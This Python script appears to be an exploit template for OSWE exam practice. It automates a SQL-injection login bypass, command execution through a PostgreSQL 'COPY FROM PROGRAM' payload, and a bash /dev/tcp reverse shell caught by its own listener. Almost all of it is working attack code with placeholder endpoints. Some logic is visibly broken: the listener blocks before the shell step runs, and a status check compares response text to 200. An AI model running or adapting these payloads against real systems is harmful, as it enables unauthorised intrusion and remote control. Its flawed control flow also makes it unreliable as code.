#!/usr/bin/env python3

"""
OSWE Skeleton for "autopwn".
This script will create a web server on {lhost}:{wport} and a reverse shell
on {lhost}:{lport}.

Step 1) Auth bypass
Step 2) RCE
Step 3) Reverse shell
"""

import http.server
import socketserver
import sys
import threading
import requests
import argparse
import urllib.parse
from datetime import datetime
import socket


# ─── Colors ────────────────────────────────────────────────────────
GREEN = '\033[0;32m'
RED = '\033[0;31m'
GREY = '\033[38;5;244m'
YELLOW = '\033[38;5;226m'
NC = '\033[0m'

# ─── Argument Parsing ────────────────────────────────────────────────────────
def parse_args():
    global args
    parser = argparse.ArgumentParser(description="OSWE Exploit Skeleton")
    parser.add_argument("-t", "--target",   required=True,  help="Target base URL (e.g. http://192.168.1.10)")
    parser.add_argument("-l", "--lhost",    required=True,  help="Attacker IP for reverse shell")
    parser.add_argument("-p", "--lport",    required=True,  type=int,   help="Attacker port for reverse shell")
    parser.add_argument("-wp", "--wport",   required=False, default=80, type=int,   help="Attacker port for http server")
    parser.add_argument("--proxy",          action="store_true", default=False, help="Enable Burp default proxies (8080)")
    parser.add_argument("--no-verify",      action="store_true", default=True,  help="Disable SSL verification")
    parser.add_argument("-d", "--debug",    action="store_true", default=False, help="Debug mode")

    args = parser.parse_args()
    return args

# ─── Session Setup ────────────────────────────────────────────────────────────
def build_session():
    s = requests.Session()
    s.verify = not args.no_verify
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    if args.proxy:
        s.proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    return s

# ─── Logging Setup ────────────────────────────────────────────────────────────
class log():
    def _ts():
        return datetime.now().strftime("%H:%M:%S")

    def success(text):
        print(f"[{log._ts()}] [{GREEN}✓{NC}] {GREEN}{text}{NC}")

    def failure(text):
        print(f"[{log._ts()}] [{RED}✘{NC}] {RED}{text}{NC}")
        if args.debug:
            log.debug("Exiting ...")

    def info(text):
        print(f"[{log._ts()}] [{NC}*{NC}] {NC}{text}{NC}")

    def debug(text):
        if args.debug:
            print(f"{GREY}[{log._ts()}] [DEBUG] {GREY}{text}{NC}")

# ─── Reverse shell listener  ───────────────────────────────────────────────────────────────
def start_listener(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
    except Exception as e:
        log.failure(f"[listener] Failed to bind to {host}:{port}\n\t {e}")
        sys.exit(1)
    
    server.listen(1)
    log.success(f"[listener] Reverse shell listening on {host}:{port}")

    conn, addr = server.accept()
    log.success(f"[listener] Connection received from {addr[0]}:{addr[1]}")

    _interact(conn)
    conn.close()
    server.close()

# ─── Shell interaction  ───────────────────────────────────────────────────────────────
def _interact(conn):
    prompt="[shell] > "
    conn.setblocking(True)
    try:
        while True:
            cmd = input(prompt)
            if not cmd.strip():
                continue
            if cmd.strip().lower() in ("exit", "quit"):
                break

            conn.sendall((cmd + "\n").encode())

            # Read the response. We don't know exactly how much is coming,
            # so read once, then drain any additional buffered data.
            conn.settimeout(0.5)
            output = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        log.failure("[listener] Connection closed by remote host")
                        return
                    output += chunk
            except socket.timeout:
                pass  # no more data waiting right now
            finally:
                conn.settimeout(None)

            print(output.decode(errors="replace"), end="")

    except (KeyboardInterrupt, EOFError):
        log.failure("[listener] Exiting listener")
        sys.exit(1)

# ─── HTTP server  ───────────────────────────────────────────────────────────────
def start_file_server(host, port):
        # Files source code
    php_file = b"<?php echo 'Hello World'; ?>"
    txt_file = b"hello world"

    # List <filename>: (<source_code>, <MIME type>) 
    routes = {
        "/file.php": (php_file, "application/octet-stream"),
        "/login": (txt_file, "application/text"),
    }

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path in routes:
                content, content_type = routes[self.path]
                self.send_response(200)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                log.info(f"[http server] {self.client_address[0]} requested {self.path} -> {YELLOW}Success!{NC}")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
                log.info(f"[http server] {self.client_address[0]} requested {self.path} -> {YELLOW}Not Found!{NC}")

        def log_message(self, format, *args):
            # Suppress default noisy logging; we print our own above
            pass

    try:
        server = socketserver.TCPServer((host, port), Handler)
    except Exception as e:
        log.failure(f"[http server] Failed to bind to {host}:{port}\n\t {e}")
        sys.exit(1)

    log.success(f"[http server] Serving files on {host}:{port}")
    for path in routes:
        print(f"\t    -> {path}")

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

######## Main Functions ########

# ─── Step 1: Auth Bypass ──────────────────────────────────────────────────────
def auth_bypass(session, target):
    log.info("Step 1: Attempting auth bypass...")

    url = f"{target}/login" # Example vulnerable endpoint

    data = { # Example data
        "username": "admin'-- -",
        "password": "anything",
    }

    r = session.post(url, data=data, allow_redirects=False)

    log.info(f"[step 1] POST {url} -> {YELLOW}{r.status_code}{NC}")
    log.debug(f"[step 1] Response:\n {r.text[:200]}")

    if r.status_code in (200, 301, 302) or "home" in r.text.lower(): # The string 'home' is a placeholder, change it
        log.success("[step 1] Auth Bypass complete!")
        cookies = r.cookies.get_dict()
        log.debug(f"[step 1] Cookies: {cookies}")
        return cookies

    log.failure("[step 1] Auth Bypass failed")
    sys.exit(1)

# ─── Step 2: Remote Code Execution ───────────────────────────────────────────
def rce(session, cookies, target, cmd):
    log.info(f"Step 2: Attempting RCE with cmd: {YELLOW}{cmd}{NC}")

    url = f"{target}/uploads/shell.php" # Example vulnerable endpoint

    payload = f"0; COPY cmd_out FROM PROGRAM '{cmd}'" # Example SQL Payload
    r = session.get(f"{url}", params={"id": payload}, cookies=cookies)
    out = r.text

    log.info(f"[step 2] GET {url} -> {YELLOW}{r.status_code}{NC}")
    log.debug(f"[step 2] Response:\n {r.text[:200]}")

    if r.status_code in (400, 404, 500) or "error" in r.text.lower(): # The string 'home' is a placeholder, change it
        log.failure(f"[step 2] RCE failed - Status code {r.status_code}")
        sys.exit(1) 

    if r.status_code == 200 or out:
        log.debug(f"[step 2] Output: {out}")
        log.success("[step 2] Step 2: RCE complete!")
        return out

    log.failure("[step 2] RCE failed")
    sys.exit(1)

# ─── Step 3: Reverse Shell ────────────────────────────────────────────────────
def reverse_shell(session, cookies, target, lhost, lport):
    log.info(f"Step 3: Attempting reverse shell to {lhost}:{lport}")

    shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" # Example payload
    log.debug(f"[step 3] Shell payload (raw): {shell}")

    # Encode to avoid bad characters
    encoded = urllib.parse.quote(shell)
    log.debug(f"[step 3] Shell payload (encoded): {encoded}")

    # Reuse the RCE vector — pass the shell command through it
    status = rce(session, cookies, target, shell)
    if status == 200:
        log.success("[step 3] Reverse shell sent, watch your listener.")
    else:
        log.failure("[step 3] Reverse Shell failed")
        sys.exit(1)

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    parse_args()
    session = build_session()
    target  = args.target.rstrip("/") # Remove final slash (/)

    log.info(f"Target: {target}")
    log.info(f"Reverse Shell address: {args.lhost}:{args.lport}")
    log.info(f"HTTP Server: {args.lhost}:{args.wport}")
    log.info(f"Proxy: {session.proxies if args.proxy else 'None'}")
    print("───────────────────────────────────────────────────────────────────────")

    # step 0 — HTTP Server
    start_file_server("0.0.0.0", args.wport)

    # Step 1 — Auth bypass (populates session cookies)
    cookies = auth_bypass(session, target)

    # Step 2 — Verify RCE with a safe command (id/whoami)
    rce(session, cookies, target, "whoami")

    # Start listener in background
    start_listener("0.0.0.0", args.lport)

    # Step 3 — Pop shell
    reverse_shell(session, cookies, target, args.lhost, args.lport)

if __name__ == "__main__":
    main()